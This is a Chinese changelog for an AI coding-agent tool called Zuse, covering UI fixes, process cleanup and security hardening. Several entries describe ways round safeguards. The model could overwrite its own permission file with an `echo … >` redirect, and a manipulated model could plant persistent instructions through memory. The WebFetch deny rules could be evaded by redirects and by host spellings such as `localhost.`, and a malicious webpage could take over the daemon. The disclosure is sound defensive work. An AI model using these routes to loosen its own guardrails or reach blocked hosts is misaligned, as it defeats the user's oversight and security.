# Zuse 功能清单（给用户看的）

> 这份文档**不讲技术细节**，只讲你能看到、能用、能测的东西。
> 每做完一个功能就往这里加一条：**做了什么 / 怎么测 / 已知限制**。
> 最新的在最上面。

## 2026-08-14：浅色主题下的灰字终于看得清了；模型/目录选择框能按 Esc 关掉

### 灰字太浅，这不是感觉问题，是算出来的

界面上有三档文字颜色:正文、次要、最淡。**最淡那一档在浅色主题下对比度只有
2.26–2.57:1** —— 无障碍标准要求正文 4.5:1,连"大字"放宽后的 3:1 都够不到。
而用这一档的地方有 55 处,字号全在 9–14.5px,全是正文,不是装饰。

深色主题好一些(2.71–3.32:1),但同样不达标。

现在两档都调过了:最淡那档提到 4.5:1 以上。**次要那档也跟着调深了** ——
因为如果只动最淡的,它会正好和次要的挤成同一个颜色,三档层级就塌成两档。
这是这次唯一的取舍,我选了保住层级。

### 顺带修掉四个"根本不存在"的颜色变量

`--fg`、`--fg-2`、`--hover`、`--danger` 这四个,代码里在用,但**从来没有定义过**。
CSS 里引用一个不存在的变量,不是"用个默认色",是**整条颜色声明作废**,元素改成
继承上级颜色 —— 表现就是"有时对有时不对"。

其中 `--hover` 最实在:深色主题下,鼠标悬停的高亮用的是"叠一层黑",在本来就黑的
背景上等于什么都没发生(实测对比度 1.013:1)。现在深色下改成叠白,悬停真的看得见了。

### 模型选择框、目录选择框:按 Esc 能关了

这两个浮层以前按 Esc 没反应。更麻烦的是:**如果当时正好有任务在跑,这个 Esc
会穿透下去把任务停掉** —— 你只想关个下拉框,结果打断了正在干的活。现在 Esc
只作用在最上面那一层。

### 怎么测

- 浅色主题下看侧栏的说明文字、"DEV"那种小标签、代码里的注释颜色 —— 应该明显比以前清楚。
- 深色主题下把鼠标移到"运行"菜单的条目上 —— 应该看得见高亮了。
- 打开顶部的"模型"或目录选择框,按 Esc —— 应该关掉,而且不会中断正在跑的任务。

### 已知限制

- **焦点陷阱还没做。** 弹窗开着时用 Tab 键仍然能跑到弹窗后面的页面上去 ——
  对纯键盘操作和读屏软件来说,`aria-modal="true"` 这个承诺目前是没兑现的。
  这需要单独一轮,这次没做。
- 对比度只按 WCAG AA(4.5:1)校准,没做到 AAA(7:1)。

## 2026-08-14：zuse 自己崩了的时候，它起的命令不再变成收不回的孤儿

### 原来的问题：崩溃是最没人管的那条路

zuse 正常关闭（Ctrl+C、或系统要求它退出）时会把在跑的命令收干净。但**它自己崩掉**的时候
——一个没接住的异常——什么都不会跑，你正在跑的命令、语言服务器、外部工具服务全部原地变孤儿。

这不是假想。代码注释里记着一次真实事故：网页那头一个推送出错，就能把整个 zuse
（你所有的会话）带走。那种死法下，清理是**零**。

我实测过孤儿有多顽固：让宿主进程崩掉之后，那个后台命令**四分半钟后还在跑**，
心跳数已经涨到 1355，最后是手动杀掉的。

### 现在

起出来的每个子进程都登记在册，进程退出时（**包括崩溃退出**）统一收掉整棵进程树。
覆盖：没接住的异常、没处理的 Promise 错误、正常退出、Ctrl+C。

### 怎么测

这条基本没有界面痕迹 —— 它的效果是「你**看不到**任务管理器里堆着一排没人管的 node」。
如果你之前发现过关掉 zuse 之后还有残留进程，现在应该少很多。

### 已知限制（这条很重要，别当成万无一失）

- **强制结束（任务管理器「结束任务」、`taskkill /F` 不带 `/T`）仍然会留孤儿。**
  那种杀法不给进程任何执行代码的机会，只能靠操作系统层面的手段（Windows Job Object）。
  我设计并**实测跑通**了那套方案，但独立评审复跑之后推翻了它 —— 它宣称的好处在实测里
  并不存在，而且我并没有真正搞懂它的触发条件。**把一个没搞懂的机制放在「能一次性
  带走整个 daemon」的位置上，不划算**，所以这一版没做，留了记录。
- 断电、内存不足被系统杀掉，同理收不了。
- 一个命令的外层壳退出了、但它自己又起了后台进程的，那个后台进程收不到 ——
  壳一死进程树就断了，事后再想收也找不着它。

## 2026-08-14：网页抓取不能再靠「转个弯」绕开你的黑名单

### 原来的问题：拦的是门牌号，不是最后进的那扇门

你可以在权限配置里写「不许访问某个网站」，比如 `deny: WebFetch(127.0.0.1)`。
以前这条规则只检查**你给的那个网址**。而网站可以回一句「你要的东西在别处，去那儿拿」
（HTTP 重定向）——**跳到哪儿去，是对方网站单方面说了算的，之前没有任何人再看一眼。**

我起了两个真的本地服务器实测：明确 deny 了 `127.0.0.1`，然后从 `localhost` 让它跳过去，
被 deny 的那台机器上的内容照样被完整取了回来。

**还有第二个问题，可能更容易吃亏**：抓完之后，返回给模型的抬头写的是**你给的那个网址**，
而内容其实来自跳转后的地方。也就是说模型被告知「这段内容来自 A」，实际上来自 B。

### 现在

- 每一次跳转，只要**换了主机**，都会重新过一遍权限闸：在配置里被 deny 的直接拒绝，
  没配过的会弹框问你。同一个主机内换路径（很常见，比如自动补个斜杠）**一次都不会问**。
- 结果里明确写出**最终落在哪个地址**，以及经过了几次跳转、起点是哪儿。
- 跳转链上出现过跨主机的，结果**不进缓存**——否则你点的「仅此一次」会在 15 分钟内被
  重复利用，变成「随便」。
- 顺手堵了一个同类的洞：`http://localhost./`（末尾多一个点）以前能骗过 `deny: WebFetch(localhost)`,
  而它**真的连得到你本机**。同类的还有 `http://[::ffff:127.0.0.1]/` 这种写法。现在两者
  都会被归一成 `localhost` / `127.0.0.1`，规则管得住了。这个洞原本在**直接抓取**时就存在，
  不需要重定向。

### 怎么测

真实例子：抓 `http://github.com/`（注意是 http），它会跳到 `https://github.com/`。
因为主机没变，**不该弹框**，而结果抬头会写成 `https://github.com/` 并注明「经 1 次重定向」。
实测输出：

```
# GitHub · Change is constant. GitHub keeps you ahead.
https://github.com/
（经 1 次重定向，起自 http://github.com/）
```

要看拦截效果，在配置里 deny 一个域名，再找个会跳到它的短链接。

### 已知限制（说清楚，别夸大）

- **短链接会多问你一次**。`t.co`、`bit.ly`、`doi.org` 这类必然跨主机，所以第一次抓会弹框。
  这是这个改动的直接代价，不是 bug。
- **判断「换没换主机」只看主机名，不看端口和 http/https**。所以同一个域名从 https 掉到 http
  不会再问你。理由：权限规则本来就只能写到主机名这一层，问了你也写不出对应的规则。
- **不解决 SSRF**。也就是说：如果一个域名在 DNS 层被解析到你的内网地址，这一版拦不住 ——
  那必须在真正建立连接时才判断得了，属于另一件事。我没有假装解决它。
- 跳转次数上限 10 次，超过会报错而不是继续跟。

## 2026-08-14：关掉 zuse 之后，它起的后台服务不再赖着不走

zuse 会在后台起两类进程：**语言服务器**（给代码补全/跳转用）和 **MCP server**（外部工具）。
以前这两类都收不干净：

- **语言服务器**：退出时的清理代码写在一个「稍后执行」的定时器里，
  而程序退出的那一刻定时器**根本不会跑** —— 所以那段清理是空的。
  审计时在这台机器上实测到 3 个残留的 tsserver。
- **MCP server**：只关掉了最外层的启动器。Windows 上真实的进程链是
  「启动器 → npx → node」三层，真正干活的那个 node 留了下来。
  今天没出事只是因为常见的 MCP server 自己会在输入断开时退出 —— **那是它做对了，不是 zuse**。
  本次审计在这台机器上数到 **10 个**这样的残留进程。

现在都收干净了。实测：连上一个 MCP server 会多出 2 个进程，断开后**回到原来的数字**。

**怎么测**：多开关几次 zuse，然后在任务管理器里看 node 进程数会不会一直涨。

## 2026-08-14：模型不能再偷偷放宽自己的权限了

### 原来的问题：护栏可以自己拆自己

zuse 的权限设置放在 `.zuse/settings.local.jsonc` 里。**而模型有两条路可以改它**，
改完之后（下一个会话起）所有的「拒绝」和「询问」全部失效：

1. **纯默认配置下**，`echo '…' > .zuse/settings.local.jsonc` 会被**静默执行**。
   原因是默认放行清单里有 `echo`、`cat` 这些「只读」命令 —— 但一个 `>` 就把它们变成了写。
2. **更直接的一条**：如果你允许了模型写项目文件（很常见，本仓自己就是），
   那它直接写这个文件就行，连命令都不用。

### 现在

- **权限配置文件本身进了「绝对不允许」名单** —— 连全自主模式也改不了。
  模型想改会拿到一句明确的「这是硬性护栏，请让用户自己改」。
- **带 `>` 写文件的命令不再被「只读命令」的放行清单批发放行**，会问你一次。
  （`ls 2>&1`、`cmd > /dev/null`、引号里的 `>` 都不受影响；
  如果你配了 `Bash(*)`（任意命令），也照旧不打扰你。）

**代价说清楚**：模型从此不能替你改 zuse 的配置，包括「帮我把这个 MCP server 加进去」
这种正当请求。这是有意的取舍 —— **管着它的那个文件，不该由它来写。**

### 顺带：存记忆现在会问你一声

`Memory` 工具原本标成「只读」，所以存记忆是不弹框的。但存进去的东西会经 MEMORY.md
进入你**此后每一个会话**的系统提示词 —— 也就是说，模型如果在某次对话里被诱导，
可以把「以后遇到 X 就做 Y」永久写进去，而你全程看不到。

现在 `save` 和 `delete` 会问你一声；查询类的（search / recall / list）照旧不打扰。

**怎么测**：让模型试着改 `.zuse/settings.local.jsonc`，应该被硬拒；
让它记一条东西，应该弹确认框；日常的 `ls`、`cat`、`echo` 照旧不打扰。

## 2026-08-14：删掉会话，它起的命令也一起停了

以前删掉一个会话，它在后台跑着的命令**一条都不会停** —— 而且从此再也看不到它们
（面板是按会话列的，会话没了就没入口了）。一个占着端口的开发服务器会一直挂在那里，
只能去任务管理器找。

现在删会话会把它起的命令一起收掉。实测：删除前 `running` → 删除后 `exited`。

顺带清掉了一个**从来没生效过**的配置项:`hooks`（在工具调用前后跑自定义命令）。
如果你曾经在配置文件里写过它 —— 它一次都没运行过，也不会报错，现在这个字段被移除了。
不是「差一点就能用」：那版实现会让一条 hook 把整个程序卡住最多 10 秒（所有会话一起卡），
而且项目里的配置文件是会进 git 的，接上之后 clone 一个别人的仓库就可能在你机器上执行任意命令。
要做得重做。

## 2026-08-14：手机上终于看得见「运行 / 复制 / 重试 / 删除」这些按钮了

### 原来的问题

代码块右上角的「▶ 运行」、消息下面的「复制 / 朗读 / 分享 / 重试」、会话列表里的删除按钮，
都是**鼠标悬停才显形**的。手机和平板没有「悬停」这回事，于是这些按钮：

- **永远看不见** —— 而「▶ 运行」是整个预览/执行功能的**唯一入口**，
  删除按钮是**唯一**的删会话入口。也就是说这些功能在手机上等于不存在。
- **但点得着** —— 一块 73×21 的透明热区盖在代码块上，手指碰到就真的触发。
  更麻烦的是「重试」：它会**回滚工作区并重跑**，而且没有确认框。

### 现在

有鼠标的设备一切照旧（悬停才显形，界面依然干净）；**没有鼠标的设备上这些按钮常驻可见**。
另外，桌面上按钮隐藏时不再拦截点击 —— 以前那块看不见的区域会吃掉你在代码块上的滑动和滚动。

### 一个差点做反的地方

第一版的写法是「默认隐藏 + 触屏时再显示」。评审用真的 iPhone 引擎测出来：
那样改完之后按钮**看得见但点不着**了 —— 比原来还糟。

原因是「显示」和「可点击」是两件事，第一版只恢复了前者。现在反过来写：
**默认可见可点，只有当设备确实有鼠标时才隐藏**。这样万一判断失误，
结果是「多显示几个能用的按钮」，而不是「按钮全死了」。

**怎么测**：用手机（或浏览器的手机模拟）打开页面，代码块右上角应该直接看到「▶ 运行」。
桌面上鼠标移开时按钮消失，且此时在代码块上左右滑动/滚动不再被那块区域挡住。

## 2026-08-14：命令里带 `&` 起后台任务，不会再把整个工具卡死

### 原来的问题

只要你（或模型）跑的命令里有后台任务——比如

```
npm run dev &          启动一个开发服务器，然后接着干别的
node worker.js &       起一个后台脚本
```

——这条命令就**再也不会返回**。前台部分明明 68 毫秒就跑完了，工具却一直等着。

原因是它在等一个永远不会来的信号：系统只有在「进程退出**并且**所有输出通道都关了」时才通知，
而后台任务恰恰还握着那根输出通道不放。

后果有三层：

1. **命令行工具永远挂着。** 不是「等满超时再报错」——超时那条路自己也不会收场，
   所以整个对话就停在那里。（期间还在往磁盘上写一个越来越大的输出文件。）
2. **右栏里的「运行」永远转圈**，看不到「运行结束」。
3. **最坏的一条**：每卡一条就永久占掉一个运行名额，一共只有 8 个。攒够 8 次，
   「运行」功能对整个程序失效，只能重启。

### 现在

改成以「进程退出」为准 —— 那才是「命令跑完了」的真正含义。实测:

- 一条 `... & echo done`：**1.7 秒返回**，输出正常，而且**后台任务还活着**。
- 从页面发起同样的命令：走到「运行结束」，退出码 0。
- 连着发 9 条：9 条全部起得来（原来第 9 条会被名额挡住）。

### 一个差点做错的地方，值得说

第一版的做法是「收尾时把输出通道关掉」。评审实测发现:**那会把你的后台任务打死** ——
它下一次打印日志时会因为「没人接收」而自杀。也就是说 `npm run dev &` 会在命令返回
250 毫秒后无声无息地死掉，而你看到的是「done，成功」。

已改成「不再读，但不关」：后台任务照常活着，内存也不会涨（实测跑 6 秒、每秒 80KB，
内存只涨了 0.9MB）。

### 已知限制

- **后台任务在前台命令结束后打印的东西，收不到了。** 它已经是另一个进程了，
  把它的输出记在一条已经报了退出码的命令名下会更让人困惑。想看输出就别用 `&`
  ——在页面上单独起一条运行更合适。
- **后台任务会变成"没人管"的进程。** 程序退出时收不掉它。这条这次没解决，
  真正的解法是操作系统层面的进程组，已记在待办里。

**怎么测**：在聊天里让它跑一条带 `&` 的命令（比如 `sleep 30 & echo ok`），应该立刻返回；
或者在右栏「运行」里发一条，看它是不是正常走到「运行结束」。

## 2026-08-14：堵住「访问一个网页 → 你的开发机被人接管」

这条是回头翻查以前的代码时发现的。**本机日常使用完全不受影响**，但如果你打算从手机 /
外网访问 zuse，下面这段值得读一遍。

### 原来的问题：光是打开一个恶意网页就够了

zuse 的 daemon 默认只听本机，但网页里的 JavaScript 是可以往本机地址发请求的。原来的
daemon 对「这个请求是从哪个页面来的」不做任何判断，于是一个恶意网页可以：

**发现你在跑 zuse → 抢先把登录口令设成它自己的 → 登录 → 让 zuse 在你机器上执行任意命令。**

你全程只是打开了一个网页。

### 现在加了三道门

1. **域名白名单。** 别人的域名指到你的本机也没用了 —— 没在白名单里的域名一律拒绝。
2. **来源检查。** 别的网站往你本机发的请求会被拒绝。

   > 为什么要两条：这两种攻击走的是不同的路。第一种攻击下，浏览器发出的「来源」和
   > 「目标」是**完全一样**的，所以只查来源根本看不出异常；反过来第二种攻击的目标地址
   > 完全合法，只有来源不对。**少任何一条都留着一个完整的洞。**

3. **一次性 setup token。** 只要 daemon 判断自己「从网上够得着」（你绑了对外地址、
   配了证书、开了隧道参数，或声明了域名），第一次设置口令时会要求贴一串启动时生成的
   随机码 —— 它打印在启动 daemon 的那个终端里，也存在数据目录下的 `setup-token` 文件里。

   没有这道门的话，临时隧道的地址谁先拿到谁就能抢先设口令 —— 而那个地址并不是秘密。

### 怎么测

- **本机日常使用**：刷新页面，一切照旧。不会多出任何一步，也不会要你贴什么码。
  （可以顺手看一眼：本机 daemon 的启动横幅里不会出现 `setup token:`。）
- **远程访问**：照 `docs/remote-access.md` 的配方做。配方已经更新，把要加的参数和
  要贴的 token 写在一起了。
- **被拒绝时**：错误页会直接告诉你该加哪个参数、该去哪里找 token，不再是一句干巴巴的
  「403」。这次顺手修了一个更早就存在的毛病 —— 以前被拒绝时，页面会莫名其妙地跳到
  「设置密码」界面，让人以为口令丢了。

### 已知限制（说清楚，别当成万能）

- 前两道门是**针对浏览器**的。它们挡的是「你打开了一个恶意网页」这条路。
  能直接连到你这个端口的程序（比如同一个局域网里的扫描工具）不受它们约束 ——
  那条路是靠第三道门（token）挡的。
- **daemon 只能看见你给它的启动参数。** 如果你用 `ssh -R`、`socat` 之类的工具把端口
  转出去，它是看不见的，也就不会主动要求 token。这种情况下请手动加上
  `--allowed-host <你的域名>`：它既是浏览器能正常访问的必要条件，也会顺带打开 token 保护。
- **先设口令，再起 daemon。** 顺序反了不会报错，但 daemon 是在启动那一刻读口令文件的，
  它不知道你后来在另一个终端设了口令。

## 2026-08-13（下午）：改完文件，点一下把整个项目跑起来

> 你问的是「如果我 edit 了其中一个文件，能不能点一下重新启动这个项目看看效果，入口在哪」。
> **第一版已经做好了**，下面既是说明也是评估结论。

### 入口在**顶部那一排、目录名旁边**：「▶ 运行 ▾」

点开是你项目里 `package.json` 的脚本列表（`dev` / `build` / `test`…），点一条就跑，
输出实时流到右栏。

**怎么测**：刷新页面 → 点顶部的「▶ 运行 ▾」→ 挑一条脚本点下去。
建议先试 `typecheck` 或 `lint` 这种会自己结束的，再试 `dev` 这种长跑的。

**为什么不放右栏**（那是最直觉的位置，但实测否掉了）：右栏在「你还没开始跑任何东西」
的时候**整个是不显示的**——入口恰好在最需要它的那一刻消失。而且右栏已经有五块内容
（待办、子代理、预览、运行输出、步骤），再塞一排按钮会把上面几块挤扁。

**放在目录名旁边还有个好处**：脚本列表是跟着**当前目录**走的。模型 `cd` 到别的项目之后
列表会换，而目录就显示在旁边，你一眼能看出「现在跑的是哪个项目」。

### 跑起来之后怎么看效果

输出里出现 `http://localhost:5173` 这类地址时，**会给你一个「打开」链接**，新窗口打开。

**不做的是「直接在右栏里嵌一个小窗口显示网页」**。技术上可行（试过了，vite 没有禁止嵌套），
但右栏最宽也就 720px，把一个开发中的页面塞进这么窄的条里，还不如你自己开个标签页。
以后真有人要再说。

### 三个实测出来的坑，都会影响你的体验

1. **本项目自己的 `dev` 脚本点了会「假装在跑」。** 它是个终端界面程序，而这里没有键盘输入。
   实测结果：不报错、不退出、正常画出欢迎界面，然后**永远停在那里等你打字**——
   而你打不了。所以运行面板顶部会常驻一行灰字：**「这里没有键盘输入，需要打字的程序会停在这儿」**。
   不做「猜哪些命令需要输入」——猜不准，还不如老实说一句。

2. **同一个脚本点两次会起两个，第二个因为端口被占瞬间失败。** 所以按钮会记住状态：
   已经在跑的时候变成「重启」，点它会先真正停掉旧的（等它确实死了）再起新的。

3. **原来「30 分钟没输出就自动停止」这条会误杀 dev server。** 实测：`vite dev` 启动完
   **1 秒就彻底安静**，之后 24 秒一个字节都没有——不吐东西正是它的正常状态。
   照原来的规则，你吃个午饭回来会发现 dev server 自己死了，而且提示是「一直没有输出，已停止」，
   完全看不懂。**已经改掉了**：项目运行不再有空闲超时。
   代价是真卡死的命令不会自动收，得你自己点停止——项目运行本来就是你盯着的，右栏一直有停止按钮。

### 还有一个已经发现、但还没解决的

**跑测试的时候，红绿颜色会丢失。** 原来的设计基于「命令行工具在非终端环境下默认不输出颜色」，
但那是拿 `git log`、`tsc -v` 这类一次性命令测的。真正的开发工具不一样——
实测 `vitest` 输出里有 44 处颜色码、`vite dev` 有 30 处。它们会被剥掉变成纯文本。

内容不会乱，但**「哪个测试失败了」这个最重要的信息，原本就是靠红色表达的**。
这条单独排期解决。

### 还有一个只有真点一遍才发现的

第一版做完、所有自动检查全绿的时候，**菜单上根本看不见脚本名**——白字白底，
对比度 1.00（能读的正文至少要 4.5）。你只看得到底下那行灰色的命令。

自动检查为什么没抓到：它查的是「这段文字在不在页面里」，而文字确实在，
**只是你看不见**。已经修好，并且给检查加了一条「量对比度」的断言，现在是 15.90。

### 这一版有什么 / 没什么

**有**：顶部运行按钮、脚本列表（跟着当前目录走）、输出实时流、
`localhost` 地址自动变成「打开」链接、已在跑时变「重启」。

**没有**：自己敲命令的输入框、同时跑多个的列表、把网页嵌在右栏里。
这三样各自都会牵出新的没定下来的问题，排在后面。

### 「在你机器上真跑代码」的底座建好了（内部改动，**页面上还看不到**）

**先说清楚：这一步做完，界面上不会有任何变化，不用去页面上找。** 它是下一步
「点一下就把模型写的 Python / Java 跑起来、输出实时流到页面」的地基，
本身没有入口。地基验收靠直接打接口，不靠点页面。

盖好的东西：能起一条长跑的命令并给它一个编号、输出边跑边往外推、超时/空闲/输出太多
各有各的收场方式、进程杀不掉时会被明确标成「僵尸」而不是悄悄消失。

**做这一步时踩到两个只有真跑才会暴露的坑**，两个单元测试全绿的时候都发现不了：

1. **中文会乱码。** 探测系统代码页那步在真实接线里从没被调用过，于是每条 Windows
   原生命令（`ping`、`dir`…）的中文都会变成 `���� Ping ...`。单元测试发现不了 ——

2. **「输出太多就停下」这条限额形同虚设。** 限额 5000 字，实际推出去 **102 万字**。
   因为「叫停进程」和「进程真的停」之间有时间差，这期间输出照流。
   真跑一条刷屏命令才量出来。

修好后同一批检查 20 项全过：中文正常、`ping` 的中文不乱码、超时 1 秒内真被杀掉、
一直在输出的进程不会被误判成卡住、限额从 102 万降到 6 千。

**怎么测**：不用测。等下一步（把它接到界面上）做完再看。

### 同一块地基又挖出四个坑（内部改动，页面上还看不到）

上面那条做完之后，请了个独立评审来挑毛病。它提的第一条是真的，顺着它又挖出三个：

1. **一个写坏的网页连接能带走你所有会话。** 往页面推输出的那段代码只要出一次错，
   整个后台进程就退出了——不是「这次运行失败」，是你开着的**全部对话一起没**。
   真跑复现确认后修掉了。
2. **看一个已经跑完的运行，页面会一直转圈。** 结果发得出去，但「说完了」这个信号
   永远发不出来，连接就那么挂着。（是上一条的修复把它从「报错」变成了「静默挂住」，
   所以必须一起修。）
3. **「关掉页面就把进程收掉」这条根本没生效。** 代码注释里写着要这么做，但实际上
   永远触发不了——你关掉页面，跑着的东西会一直跑到 5 分钟超时。现在真的会被收掉了
   （实测 0.58 秒）。
4. **有一项自动检查是假的。** 它靠系统碰巧输出中文才有意义；这台机器这轮输出的是英文，
   于是它永远打勾、什么也没检查。改成：测不了就明说测不了，另外加了一项不看系统语言的。

**怎么测**：还是不用测，界面上仍然没有入口。写在这里是因为第 3 条会改变行为——
下一步做完之后，**你关掉页面，跑着的代码就会被停掉**，这是有意为之。

## 2026-08-13

### 模型写的 Python / Java，点一下就在你电脑上真跑起来

**这是前面几天那些「看不到的地基」第一次露出水面。**

模型回复里的 Python 或 Java 代码块，右上角会多一个 **「在本机运行」**。点它 →
弹一个确认框（**明确告诉你这会在你的电脑上真的执行这段代码**）→ 确认之后右栏出现输出，
**边跑边刷**，不是等它跑完一次性给你。

- 输出分两块：正常输出在上，**错误输出在下、标红**
- 跑着的时候有「停止」按钮
- 结束时会明确告诉你为什么结束：正常结束 / 退出码几 / 超时 / 输出太多被截断 /
  **没能启动（本机没装 uv 或 java）**
- 中文不会乱码 —— Python 的 traceback、Java 的编译错误都试过

**怎么测**：让模型写一段 Python（比如「写个脚本打印 1 到 10 的平方」），
点代码块右上角的「在本机运行」。想试错误处理就让它写一段会报错的。

**已知限制，先说清楚**：

1. **模型看不到运行结果。** 报错了得你自己把错误贴回聊天框告诉它。这是有意为之的第一版，
   下一步会让模型能直接看到。
2. **跑不了第三方库。** `import pandas` 会失败 —— 这一步只跑独立的小片段，
   不碰你项目里装的依赖（这样它才不会在你的仓库里乱建虚拟环境）。
3. **关掉运行面板 = 停止运行。** 切换会话也一样。这是有意的：跑给谁看呢。
4. 只支持 Python 和 Java。HTML/JS/React/Vue 走的还是原来的预览。
5. 本机要装了 `uv`（Python）和 `java` 才跑得起来。没装会明确告诉你。

### 顺带修的（不用测）

- **daemon 关掉时会把在跑的东西一起收掉**。以前不收 —— 现在影响还不大（5 分钟会自己超时），
  但下一步做「跑整个项目」时，不修就会留下一个永远占着端口的开发服务器。
  **仍有一个没解决的口子**：用强制方式杀掉 daemon（任务管理器那种）时它来不及清理。

## 2026-08-11

### 主画面只留对话，工具调用挪到右边按轮次翻

**以前**：模型每查一个文件、每跑一条命令，主画面上就多一张卡片。一次稍微复杂点的任务下来，
你要在十几张卡片之间找自己刚才问了什么、它最后答了什么。

**现在**：主画面只有你说的话和它说的话。所有工具调用收进右侧栏最下面的「中间步骤」，
**一行一轮**，点哪行就在原地展开哪行——跟 QQ 好友分组那个折叠列表一个样：

```
任务                    3 / 6        ← 待办在上，一直挂到全部完成才消失
项目开发                3 / 3
日常工作                0 / 3
─────────────────────────────
▾ 中间步骤        8 轮              ← 点这行可以整块收起来
  ▸ 1  先用 Bash 跑一下 date，再…  2   ← 右边的数字 = 那轮调了几次工具
  ▾ 2  再用 Bash 跑一下 whoami…   1
      ⚙ Bash  Display current logged-in…   ← 展开的内容就贴在自己那行下面
  ▸ 3  再用 Bash 跑一下 hostname  1
```

同时只展开一行（点另一行，上一行自动收起）。展开中的那行会**粘在顶部**，
所以一轮调了十几次工具、滚到中段时也看得见自己在哪一轮。

点某一轮展开，主画面会**同时滚到那一轮的提问上并闪一下**，两边对得上号。
再点一下那行只是收起来，**不会**把主画面挪走。
读旧轮次的时候发新消息，它不会把你拽走；点回最新那行就恢复自动跟随。

纯聊天的轮次（没调过工具的）不会占一行——所以随便聊几句不会冒出一堆条目。

**开关**：标题栏右上角那个 `◧` 按钮。关掉就回到以前的样子，工具卡片全部回到主画面。

**怎么测**：让它跑几条命令，看主画面是不是清爽了；然后点右下角列表里的第 1 行，
看主画面有没有滚到第一个问题上。窗口拉窄到一半宽度时，这块会跑到输入框上方变成一行
「▸ 中间步骤 N 轮」，点开还能用——**这一条值得试**，它是这次唯一没法靠肉眼一眼看出来的地方。

### 说实话：上面这个功能第一版是有 bug 的，会吞掉模型的回答

第一版判断"哪句是最终回答"的办法是「取这一轮最后说的那段话」。听起来没问题，
但模型经常是**先给完答案，再顺手跑条命令收个尾**。于是：

```
你  ：第二个，也改成全部完成
它  ：善。日常工作组三事，皆已毕矣 …        ← 真正的回答，被当成"中间过程"藏起来了
它  ：我将执行 pwd 命令来查看当前工作目录。
它  ：当前工作目录为 /e/ai-study/zuse       ← 主画面只显示了这句
```

你问"改成全部完成"，界面答"当前工作目录为 …"。这是从你自己的会话记录里翻出来的真事，
不是假想的情况。

**已修**：现在**一句正文都不会被藏起来**，只有工具调用卡片会挪到右边。
代价是主画面偶尔会多出"我将执行 pwd 命令"这种没营养的话——但多几句废话，
远好过让你不知道自己少看了什么。

顺带也修了另外三个只有真拉窗口才会撞见的问题：右边曾经并排出现两条侧栏把正文挤窄 30%；
窗口窄一点的时候中间步骤会被预览面板整个盖住、点都点不到；轮次多了以后当前在哪一轮
要手动往下拖才看得见。

### 待办可以分成好几个独立的清单了

**以前**：让模型"做3个todolist"，它只能把 9 条挤在一个列表里，靠在每条前面写
"🚀 项目A - 前端重构：…"来假装分组。两个后果：正文被组名占掉一截（右栏本来就窄，经常折行）；
**更麻烦的是模型自己会认错组** —— 你说"第三个 list 全改成进行中"，它改错成了第一个。

**现在**：组的归属是一个独立字段，不再藏在正文里。右栏长这样：

```
任务                  0 / 9
项目A - 开发计划       0 / 3      ○ 需求分析  ○ 技术选型  ○ 架构设计
日常待办              0 / 3      ● 买菜      ○ 做饭      ○ 洗碗
学习计划 - 编程        0 / 3      ● 阅读第1章 ● 阅读第2章 ● 完成练习题
```

每组有自己的进度，顶上还有一个总进度。正文里不再有 emoji 前缀。

**怎么测**：新开一个对话，说"给我做3个todolist"，然后说"第三个todolist全都改成进行中"——
看它改的是不是第三个。（这两句正是之前出错的那两句。）

### 顺手修了两个你可能撞见过的怪事

**待办莫名其妙被换掉**：模型派子代理干活时，子代理也会建自己的待办，而它写的那份会
**整个顶掉你正在看的**。现在子代理不再有这个工具（它的待办对你不可见，写进去纯属破坏）。
同类问题的"定时自唤醒"也一并修了。

**分组聊着聊着消失**：对话很长触发自动压缩后，模型会忘掉分组、退回一个平表。
现在分组信息会跟着一起进摘要。

### 修好了「模型突然开始说胡话」——它其实是被换成了一个 OCR 模型

**症状**：聊得好好的，模型忽然对每一句话都回同样一段 JSON，比如 `{"text": "生活琐事"}`，
问它"你怎么了"也是这个。顶栏显示的模型名看起来一切正常。

**真相**：模型在你不知情的情况下被换掉了。当主模型报错（额度、限流、暂时不可用），
zuse 会自动切到同一家的下一个模型顶上——但它当时**不看那个模型是干什么用的**，
于是切到了配置里紧挨着的一个**图片识别（OCR）模型**。那个模型没坏，它在老老实实
干 OCR 的活：把输入转成 `{"text": "..."}`。只是它压根不是用来聊天的。

顶栏还显示旧名字，所以你完全看不出发生过切换。

**现在**：自动切换会跳过所有标注为 OCR / 语音合成 / 向量化 / 图片生成的模型；
命令行的 `/model` 列表也不再列它们；就算你手动输入一个，它会明确告诉你
"这个模型不能作主模型"，而不是切过去然后开始说胡话。

**怎么测**：正常用就行。如果你之前有会话卡在这个状态，顶栏模型下拉手动切回来即可。

### 图片没解析成功时，会明确告诉你

**症状**：你发几张图，模型的回答看起来完全正常，但其实它**根本没看见其中某张**——
它是靠别的图和聊天历史圆出来的。你没有任何办法分辨。

**原因**：主模型不支持看图时，zuse 会先请一个辅助的识图模型把图描述成文字。
这一步失败时，旧代码把错误悄悄换成一句"(图片解析失败)"塞给模型当作图片内容，
既不报错也不提示。模型以为那七个字就是图里的东西，于是照着编。

**现在**：哪张图没解析成功会直接显示出来，带上原因，例如
「以下图片解析失败，模型没有看到它们的内容：「screenshot.png」（rate limited）」。
这条提示也从原来的灰色改成了醒目的琥珀色——之前它比正文还淡，等于没提示。

另外给识图这一步加了 60 秒上限：以前如果对方服务器连上了却一直不回，
页面就一直转圈，连"失败了"都等不到。

**怎么测**：正常发图。想主动验证的话，把配置里的 `imageModel` 改成一个不存在的模型名，
再发图，应该会看到具名的失败提示，而不是一次「看起来正常」的回答。

### 任务面板：勾选状态不对的问题修好了

**症状**：右侧任务列表里某一条明明是「未开始」，前面的勾却是打上的，而且刷新也不好。

**原因**：那个勾只在第一次画出来时读了状态，之后状态变了它不再跟着变。
所以一旦某个位置曾经出现过「已完成」的条目，后来换成未开始的，勾就摘不掉了。

**现在**：三种状态互相区分得清清楚楚——已完成是打勾+删除线，进行中是实心方块，
未开始是空框。

**怎么测**：让模型建几条待办，再让它改其中一条的状态，看勾有没有跟着变。

### 全自主档改名叫 `bypass`（老名字 `bypassPermissions` 照旧能用）

配置里那个又长又拗口的 `bypassPermissions` 正式改名叫 **`bypass`**。以后写配置：

```jsonc
{ "permissions": { "defaultMode": "bypass" } }
```

**你不需要动任何现有配置。** 老名字 `bypassPermissions` 被保留成**只读别名** —— 无论是各台机器上
`settings.json(c)` 里的 `permissions.defaultMode`，还是早先建的定时任务里的 `permissionMode`，
读进来都会被认成 `bypass`，行为一字不变。只是**新写入**的配置一律用新名字。

顺带一提，下面 2026-08-07 那条里提到「你全局配置里写的 `"defaultMode": "bypass"` 不是合法值」——
**现在它是合法值了**，而且就是正名。也就是说你当初想开的那个档，现在真的会开起来。
